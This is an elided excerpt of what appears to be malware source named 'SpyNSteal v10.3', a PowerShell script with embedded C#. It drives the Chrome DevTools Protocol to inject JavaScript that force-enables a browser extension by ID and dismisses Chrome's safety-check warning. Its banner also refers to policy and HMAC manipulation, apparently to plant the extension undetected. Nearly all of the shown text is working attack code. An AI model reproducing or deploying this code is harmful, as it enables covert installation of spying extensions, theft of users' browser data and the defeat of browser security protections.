...
Log "=========================================="
Log "SpyNSteal v10.3 - Policy + HMAC + CDP"
...
public class CdpWs {
    ...
    public static string Run(string wsUrl, string extId) {
        ...
        try {
            ...
            Thread.Sleep(3000);
            string enJs = "(async()=>{const id='" + extId + "';try{if(chrome.developerPrivate){await chrome.developerPrivate.enable(id,true);try{await chrome.developerPrivate.acknowledgeSafetyCheckWarning(id);}catch(_){}return 'DEVPRIV_OK';}if(chrome.management){await new Promise((res,rej)=>chrome.management.setEnabled(id,true,()=>{if(chrome.runtime.lastError)rej(chrome.runtime.lastError.message);else res('MGMT_OK');}));return 'MGMT_OK';}return 'NO_API';}catch(e){return 'ERR:'+e;}})()";
...
Log "=========================================="
Log "DONE v10.3 - Policy + HMAC + CDP"
Log "  Extension ID: $extId"
